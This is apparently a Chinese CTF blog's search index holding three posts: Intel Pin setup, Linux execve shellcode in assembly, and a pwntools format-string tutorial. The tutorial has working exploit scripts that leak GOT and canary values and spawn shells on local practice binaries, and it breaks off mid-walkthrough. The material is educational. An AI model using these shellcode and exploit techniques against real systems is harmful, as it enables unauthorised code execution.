<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Intel Pin的安装与配置</title>
    <url>/2021/02/18/Intel-Pin%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Pin是Intel开发的二进制动态插桩引擎，支持Windows、Linux、Mac、Android，并提供了API可发开自己的插桩工具</p>
<a id="more"></a>

<p><a href="https://software.intel.com/content/www/us/en/develop/articles/pin-a-dynamic-binary-instrumentation-tool.html">Pin - A Dynamic Binary Instrumentation Tool</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol>
<li><p>下载<a href="https://software.intel.com/content/www/us/en/develop/articles/pin-a-binary-instrumentation-tool-downloads.html">pin</a>并解压到目录下</p>
</li>
<li><p>将<code>pin.exe</code>备份重命名，新建<code>pin32.bat</code>和<code>pin64.bat</code>文件</p>
</li>
<li><p>向<code>pin32.bat</code>和<code>pin64.bat</code>文件中写入如下内容（64位的将<strong>ia32</strong>替换为<strong>Intel64</strong>）</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">@echo <span class="literal">off</span></span><br><span class="line">%~dp0<span class="string">\ia32\bin\pin.exe</span> %*</span><br></pre></td></tr></table></figure></li>
<li><p>添加至环境变量PATH中，即可以使用<code>pin32</code>和<code>pin64</code></p>
</li>
</ol>
<h3 id="MyPinTool"><a href="#MyPinTool" class="headerlink" title="MyPinTool"></a>MyPinTool</h3><p>在目录<code>%PinDir%\source\tools\MyPinTool</code>下有示例代码，使用VS编译即可，编译中可能存在错误，对照错误提示修改，主要的编译环境配置如下：</p>
<ul>
<li><p><code>C/C++ --&gt; 常规 --&gt; 附加包含目录</code>添加如下路径：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\i</span>nclude<span class="symbol">\p</span>in</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\i</span>nclude<span class="symbol">\p</span>in<span class="symbol">\g</span>en</span><br><span class="line">..<span class="symbol">\I</span>nstLib</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\c</span>omponents<span class="symbol">\i</span>nclude</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\s</span>tlport<span class="symbol">\i</span>nclude</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\l</span>ibstdc++<span class="symbol">\i</span>nclude</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\c</span>rt<span class="symbol">\i</span>nclude</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\c</span>rt</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\c</span>rt<span class="symbol">\i</span>nclude<span class="symbol">\k</span>ernel<span class="symbol">\u</span>api</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\c</span>rt<span class="symbol">\i</span>nclude<span class="symbol">\k</span>ernel<span class="symbol">\u</span>api<span class="symbol">\a</span>sm-x86</span><br><span class="line"></span><br><span class="line">对x86需要额外添加：</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\c</span>rt<span class="symbol">\i</span>nclude<span class="symbol">\a</span>rch-x86</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\x</span>ed-ia32<span class="symbol">\i</span>nclude<span class="symbol">\x</span>ed</span><br><span class="line"></span><br><span class="line">对x64需要额外添加：</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\c</span>rt<span class="symbol">\i</span>nclude<span class="symbol">\a</span>rch-x86_64</span><br><span class="line">..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\e</span>xtras<span class="symbol">\x</span>ed-intel64<span class="symbol">\i</span>nclude<span class="symbol">\x</span>ed</span><br></pre></td></tr></table></figure></li>
<li><p><code>链接器 --&gt; 高级 --&gt; 映像具有安全异常处理程序</code>设置为<strong>否</strong></p>
</li>
<li><p><code>链接器 --&gt; 输入 --&gt; 附加依赖项</code>添加如下项目：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">pin</span><span class="selector-class">.lib</span></span><br><span class="line"><span class="selector-tag">xed</span><span class="selector-class">.lib</span></span><br><span class="line"><span class="selector-tag">pinvm</span><span class="selector-class">.lib</span></span><br><span class="line"><span class="selector-tag">pincrt</span><span class="selector-class">.lib</span></span><br><span class="line"><span class="selector-tag">kernel32</span><span class="selector-class">.lib</span></span><br><span class="line"><span class="selector-tag">crtbeginS</span><span class="selector-class">.obj</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">x86</span>需要额外添加：</span><br><span class="line"><span class="selector-tag">ntdll-32</span><span class="selector-class">.lib</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">x64</span>需要额外添加：</span><br><span class="line"><span class="selector-tag">ntdll-64</span><span class="selector-class">.lib</span></span><br></pre></td></tr></table></figure>
<p>编译完成后会在相应的生成目录下生成<code>MyPinTool.dll</code></p>
</li>
</ul>
<p>执行<code>pin32 -t .\MyPinTool.dll -o log.log -- cmd /c echo 123</code>，可记录<code>MyPinTool.dll</code>中基本块数目和指令数目</p>
<p><img src="/2021/02/18/Intel-Pin%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/1.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Pwn - Shellcode</title>
    <url>/2021/02/25/Linux-Pwn-Shellcode/</url>
    <content><![CDATA[<p>简易shellcode：使用<code>execve</code>来调用本地shell</p>
<a id="more"></a>

<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>系统调用相关的指令有：</p>
<ul>
<li><code>int 0x80/iret</code><ul>
<li>软中断</li>
<li><code>eax</code>为系统调用号，参数依次为<code>ebx</code>、<code>ecx</code>、<code>edx</code>、<code>esi</code>、<code>edi</code> </li>
</ul>
</li>
<li><code>sysenter/sysret</code><ul>
<li>x86下快速系统调用</li>
</ul>
</li>
<li><code>syscall/sysret</code><ul>
<li>x64下快速系统调用</li>
<li><code>rax</code>为系统调用号，参数依次为<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code> </li>
</ul>
</li>
</ul>
<h2 id="Linux-execve-shellcode"><a href="#Linux-execve-shellcode" class="headerlink" title="Linux execve shellcode"></a>Linux execve shellcode</h2><p>利用<code>execve</code>系统调用可以启动一个新程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EXECVE(2)                                        Linux Programmer<span class="string">&#x27;s Manual                                        EXECVE(2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">NAME</span></span><br><span class="line"><span class="string">       execve - execute program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SYNOPSIS</span></span><br><span class="line"><span class="string">       #include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       int execve(const char *filename, char *const argv[],</span></span><br><span class="line"><span class="string">                  char *const envp[]);</span></span><br></pre></td></tr></table></figure>
<p>在<code>unistd_32.h</code>和<code>unistd_64.h</code>下保存着各个系统调用编号</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// unistd_32.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// unistd_64.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br></pre></td></tr></table></figure>


<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>需要注意<code>/bin/sh</code>为7个字节，改为<code>/bin//sh</code>为8个字节刚好把<code>\x00</code>给去掉，而linux解析不会出问题，防止<code>NULL</code>截断</p>
<p>由于字节序的问题，<code>/bin/sh</code>必须要做处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; execve(&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;)</span><br><span class="line">    xor eax, eax</span><br><span class="line">    push eax</span><br><span class="line"></span><br><span class="line">    ; ecx -&gt; args, edx -&gt; env &#x3D;&#x3D; NULL</span><br><span class="line">    mul ecx</span><br><span class="line"></span><br><span class="line">    ; push &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">    push 0x68732F2F</span><br><span class="line">    push 0x6E69622F</span><br><span class="line"></span><br><span class="line">    ; ebx -&gt; &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">    mov ebx, esp</span><br><span class="line"></span><br><span class="line">    ; call execve</span><br><span class="line">    mov al, 11</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>




<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>在x64下<code>/bin/sh</code>刚好可以利用传输数据时64位位长来隐式将<code>\x00</code>填上去，不用考虑截断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; rsi -&gt; args</span><br><span class="line">	xor rsi,rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line"></span><br><span class="line">    ; push &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">	mov rdi,0x68732f6e69622f</span><br><span class="line">	push rdi</span><br><span class="line">	push rsp</span><br><span class="line">    ; rdi -&gt; &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">	pop rdi</span><br><span class="line"></span><br><span class="line">	push 59</span><br><span class="line">	pop rax</span><br><span class="line">	cdq</span><br><span class="line">    ; call execve(&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;)</span><br><span class="line">	syscall</span><br></pre></td></tr></table></figure>




<h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; GetShellCode.sh</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$2</span> = <span class="string">&quot;-m32&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    nasm -f elf32 <span class="variable">$1</span> -o shellcode.o</span><br><span class="line">    ld -m elf_i386 shellcode.o -o shellcode</span><br><span class="line">    rm -rf shellcode.o</span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$2</span> = <span class="string">&quot;-m64&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    nasm -f elf64 <span class="variable">$1</span> -o shellcode.o</span><br><span class="line">    ld -m elf_x86_64 shellcode.o -o shellcode</span><br><span class="line">    rm -rf shellcode.o</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Pwn - pwntools fmtstr模块</title>
    <url>/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>pwntools中的pwnlib.fmstr模块提供了字符串漏洞利用的工具。</p>
<p>官方文档：<a href="https://docs.pwntools.com/en/stable/fmtstr.html">pwnlib.fmtstr — Format string bug exploitation tools</a></p>
<p>该模块中定义了<code>FmtStr</code>类和<code>fmtstr_payload</code>函数</p>
<a id="more"></a>

<p><code>FmtStr</code>提供了自动化的字符串漏洞利用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">classpwnlib.fmtstr.FmtStr(execute_fmt, offset=<span class="literal">None</span>, padlen=<span class="number">0</span>, numbwritten=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>execute_fmt</code>：与漏洞进程交互的函数</li>
<li><code>offset</code>：控制的第一个格式化程序的偏移</li>
<li><code>padlen</code>：在payload前添加的填充大小</li>
<li><code>numbwritten</code>：已经写入的字节数</li>
</ul>
<p><code>fmtstr_payload</code>用于自动生成格式化字符串payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>) → <span class="built_in">str</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>offset</code>：控制的第一个格式化程序的偏移</li>
<li><code>writes</code>：为字典，用于往addr中写入value，例如**{addr:** <strong>value,</strong> <strong>addr2:</strong> <strong>value2}</strong></li>
<li><code>numbwritten</code>：已经由<code>printf</code>写入的字节数</li>
<li><code>write_size</code>：必须是<code>byte/short/int</code>其中之一，指定按什么数据宽度写（<code>%hhn/%hn/%n</code>）</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>编译如下程序<code>cc -m32 -fno-stack-protector -no-pie main.c -o main</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">        read(<span class="built_in">stdin</span>, buf, <span class="number">1024</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在此程序中，可以通过<code>printf</code>泄露并修改其地址为<code>system</code>，并在下次传入<code>/bin/sh</code>来获取shell</p>
<p>首先调试查看输入的缓冲区在栈上的偏移，这里输入字符串”AAAA”，可以看到这里的<code>0x41414141</code>位于<code>printf</code>可变参列表的第四个，即偏移4</p>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/1.png"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先需要先获取<code>printf</code>的got地址和libc中的偏移，以及<code>system</code>在libc中的偏移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">log,info(<span class="string">&quot;printf_got =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_got))</span><br><span class="line">log,info(<span class="string">&quot;printf_offset =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_offset))</span><br><span class="line">log,info(<span class="string">&quot;system_offset =&gt; %s&quot;</span> % <span class="built_in">hex</span>(system_offset))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/2.png"></p>
<p>使用如下命令，也可得到相同的结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取printf_got</span></span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ readelf -r main</span><br><span class="line">...</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取printf_offset</span></span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ objdump -T /lib/i386-linux-gnu/libc.so.6 | grep <span class="built_in">printf</span></span><br><span class="line">...</span><br><span class="line">00049680 g    DF .text	0000002a  GLIBC_2.0   <span class="built_in">printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取system_offset</span></span><br><span class="line">pwn@ubuntu:~/workspace/format_vuln$ objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system</span><br><span class="line">...</span><br><span class="line">0003adb0  w   DF .text	00000037  GLIBC_2.0   system</span><br></pre></td></tr></table></figure>
<p>接着先试用一下<code>FmtStr</code>类来自动获取偏移，需要一个与进程交互函数<code>get_vuln_offset</code>，创建<code>FmtStr</code>对象并从返回值中获得偏移<code>vuln_offset</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vuln_offset</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">vuln_offset = FmtStr(get_vuln_offset).offset</span><br><span class="line">log,info(<span class="string">&quot;vuln_offset =&gt; %s&quot;</span> % <span class="built_in">hex</span>(vuln_offset))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/3.png"></p>
<p>之后构造第一次泄露<code>printf</code>实际地址的payload，并发送给程序接收8个字节的输出，其中后4字节就是<code>printf</code>的实际地址</p>
<p>利用<code>printf</code>在libc中的偏移计算<code>system</code>的实际地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(printf_got) + <span class="string">&quot;%&#123;&#125;$.8s&quot;</span>.<span class="built_in">format</span>(vuln_offset)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">log,info(<span class="string">&quot;printf address =&gt; %s&quot;</span> % <span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">system_addr = printf_addr - printf_offset + system_offset</span><br><span class="line">log,info(<span class="string">&quot;system address =&gt; %s&quot;</span> % <span class="built_in">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/4.png"></p>
<p>最后，试着使用<code>fmtstr_payload</code>构造漏洞利用payload，获取shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(vuln_offset, &#123;printf_got : system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/5.png"></p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="HITCON-CMT-2017-pwn200"><a href="#HITCON-CMT-2017-pwn200" class="headerlink" title="HITCON CMT 2017: pwn200"></a>HITCON CMT 2017: pwn200</h3><p>该题目有编码，编译开启Cannary和NX</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">canary_protect_me</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">printf</span>(buf);	<span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    gets(buf);		<span class="comment">// 缓冲区溢出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出<code>printf</code>函数存在格式化字符串漏洞，而<code>gets</code>存在栈溢出，由于开启了Cannary，可以用<code>printf</code>泄露Cannary值然后通过栈溢出覆盖为相同的值，将返回地址替换为<code>canary_protect_me</code>地址</p>
<p>首先获取Cannary值的位置，可以看到在<code>ebp-0xc</code>处，之后断在调用<code>printf</code>上，计算偏移</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048564 &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x08048568 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x0804856b &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x0804856e &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x0804856f &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048571 &lt;+13&gt;:	push   ecx</span><br><span class="line">   0x08048572 &lt;+14&gt;:	sub    esp,0x34</span><br><span class="line">   0x08048575 &lt;+17&gt;:	mov    eax,gs:0x14</span><br><span class="line">   0x0804857b &lt;+23&gt;:	mov    DWORD PTR [ebp-0xc],eax	; Cannary</span><br><span class="line">   </span><br><span class="line"><span class="comment"># Canany地址   </span></span><br><span class="line">gdb-peda$ x/wx <span class="variable">$ebp</span>-0xc</span><br><span class="line">0xffffcf4c:	0xe7af4300</span><br><span class="line"><span class="comment"># 栈顶</span></span><br><span class="line">gdb-peda$ x/wx <span class="variable">$esp</span></span><br><span class="line">0xffffcf10:	0xffffcf24</span><br><span class="line"><span class="comment"># 偏移</span></span><br><span class="line">gdb-peda$ <span class="built_in">print</span> <span class="variable">$ebp</span>-0xc-<span class="variable">$esp</span></span><br><span class="line"><span class="variable">$7</span> = 0x3c</span><br><span class="line"><span class="comment"># 偏移，即15</span></span><br><span class="line">gdb-peda$ <span class="built_in">print</span> 0x3c/4</span><br><span class="line"><span class="variable">$8</span> = 0xf</span><br></pre></td></tr></table></figure>
<p>拿到了Cannary的偏移，接着计算返回地址的位置，由于直到了Cannary的位置<code>ebp - 0xc</code>，返回地址在<code>ebp + 4</code>，所以可以变相求得返回地址相对于Cannary偏移<code>+0x10</code>，由于Cannary占4字节，填充完Cannary后偏移<code>+0xc</code>是返回地址，断在最后一个<code>gets</code>函数上，计算<code>buf</code>与Cannary的偏移为<code>0x28</code>，之后就可以构造exp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./binary_200&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;%15$x&quot;</span>)</span><br><span class="line">cannary_value = <span class="built_in">int</span>(p.recv(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;Cannary Value =&gt; %s&quot;</span> % <span class="built_in">hex</span>(cannary_value))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x28</span> + p32(cannary_value) + <span class="string">&quot;B&quot;</span> * <span class="number">0xc</span> + p32(<span class="number">0x0804854D</span>)	<span class="comment"># 0x0804854D为canary_protect_me地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/6.png"></p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>使用GCC编译时，可能会在生成的函数序言和尾声中额外添加一些代码，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; 序言</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line"></span><br><span class="line">; 尾声</span><br><span class="line">mov     ecx, [ebp-4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<p>根据<a href="https://stackoverflow.com/questions/41140089/gcc-generated-assembly">相关资料</a>这段额外代码主要用于在堆栈上作16字节对齐，在x64下生成x86程序均会产生这种额外的代码，这种额外添加的代码会对缓冲区溢出覆盖<code>eip</code>造成一点点影响，但依然是可利用的。</p>
<p><code>esp</code>是来自<code>ecx</code>，而<code>ecx</code>是<code>[ebp - 4]</code>，栈基址<code>ebp</code>在函数内一般是不会变动且位于高地址上，溢出是可以覆盖到此处，那么就可以实现控制<code>ecx</code>来简介控制<code>esp</code></p>
<h3 id="NJCTF-2017-pingme"><a href="#NJCTF-2017-pingme" class="headerlink" title="NJCTF 2017: pingme"></a>NJCTF 2017: pingme</h3><p>此题只提供远程IP及端口，没有二进制文件，于是也就模拟同样在本地开启服务监听，不看二进制文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:8888,reuseaddr,fork <span class="built_in">exec</span>:./pingme &amp;</span><br></pre></td></tr></table></figure>
<p>连接上去尝试输入一些东西，可以看到有格式化漏洞的痕迹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace/format_vuln$ nc 127.0.0.1 8888</span><br><span class="line">Ping me</span><br><span class="line">ABCD</span><br><span class="line">ABCD</span><br><span class="line">ABCD%x</span><br><span class="line">ABCD40</span><br></pre></td></tr></table></figure>
<p>先确定一下此处的偏移，结果为7</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8888&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_vuln_offset</span>(<span class="params">payload</span>):</span>   </span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Ping me\n&quot;</span>)</span><br><span class="line">vuln_offset = FmtStr(get_vuln_offset).offset</span><br><span class="line">log.info(<span class="string">&quot;vuln offset =&gt; %d&quot;</span> % vuln_offset)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/02/28/Linux-Pwn-pwntools-fmtstr%E6%A8%A1%E5%9D%97/7.png"></p>
<p>接着就可以利用格式化字符串漏洞来dump内存，由于此程序只开启了NX保护，x86下进程默认装载地址为<code>0x8048000</code>，dump一个分页大小也就足够了</p>
